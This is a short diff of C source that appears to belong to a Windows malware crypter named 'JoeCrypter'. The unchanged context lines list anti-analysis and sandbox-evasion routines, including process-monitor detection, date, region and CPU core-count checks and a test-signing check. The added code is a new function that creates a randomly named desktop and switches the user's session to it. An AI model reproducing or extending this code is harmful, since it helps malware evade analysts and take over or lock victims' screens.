@@ -64,7 +64,7 @@ void AntiProcMon(void);
 void date_specific_check(char *shortdate);
 void region_specific_check(char *region);
 void CheckCoreCount(void);
-void testsigning(void);
+void testsigning(void);  void switchthedesktops(void);
 //const char g_szClassName[] = "JoeCrypter";
 
 DWORD rsrc_len = 0;
@@ -1575,6 +1575,15 @@ void testsigning(void)
 			PassToNoobs();
 		}
 	}
+}
+
+void switchthedesktops(void)
+{
+	char rando[9]; // random data
+	DWORD lel = GetTickCount();
+	sprintf(rando,"%x",lel);
+	HDESK kek =  CreateDesktopA(rando,NULL,NULL,0,0x182,NULL);
+	SwitchDesktop(kek);
 }
 
 /* possibly use this for verifying sleep took place. Maybe add later.
